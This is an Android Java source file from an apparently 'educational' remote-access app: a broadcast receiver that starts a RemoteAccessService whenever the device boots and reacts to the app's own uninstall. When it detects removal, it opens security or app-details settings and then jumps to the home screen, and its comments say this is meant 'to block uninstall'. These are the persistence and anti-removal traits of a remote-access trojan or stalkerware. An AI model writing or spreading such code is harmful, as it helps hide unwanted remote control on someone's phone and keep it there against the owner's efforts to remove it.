package com.remoteaccess.educational.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class PackageChangeReceiver extends BroadcastReceiver {

    private static final String TAG = "PackageChangeReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null) return;
        
        String action = intent.getAction();
        
        if (Intent.ACTION_PACKAGE_REMOVED.equals(action) || 
            Intent.ACTION_PACKAGE_FULLY_REMOVED.equals(action)) {
            
            if (intent.getData() != null) {
                String packageName = intent.getData().getSchemeSpecificPart();
                
                if (packageName != null && packageName.equals(context.getPackageName())) {
                    Log.w(TAG, "Uninstall detected for: " + packageName);
                    onUninstallAttempt(context);
                }
            }
        }
        
        if (Intent.ACTION_BOOT_COMPLETED.equals(action)) {
            Log.d(TAG, "Device booted - restarting services");
            onBootCompleted(context);
        }
    }

    private void onUninstallAttempt(Context context) {
        try {
            // Open security settings to block uninstall
            Intent intent = new Intent(android.provider.Settings.ACTION_SECURITY_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        } catch (Exception e) {
            try {
                Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                intent.setData(android.net.Uri.parse("package:" + context.getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
            } catch (Exception e2) {
                // Ignore
            }
        }
        
        // Go to home screen
        try {
            Intent intent = new Intent(Intent.ACTION_MAIN);
            intent.addCategory(Intent.CATEGORY_HOME);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        } catch (Exception e) {
            // Ignore
        }
    }

    private void onBootCompleted(Context context) {
        // Start the remote access service on boot
        try {
            Intent serviceIntent = new Intent(context, com.remoteaccess.educational.services.RemoteAccessService.class);
            context.startForegroundService(serviceIntent);
        } catch (Exception e) {
            // Ignore
        }
    }
}
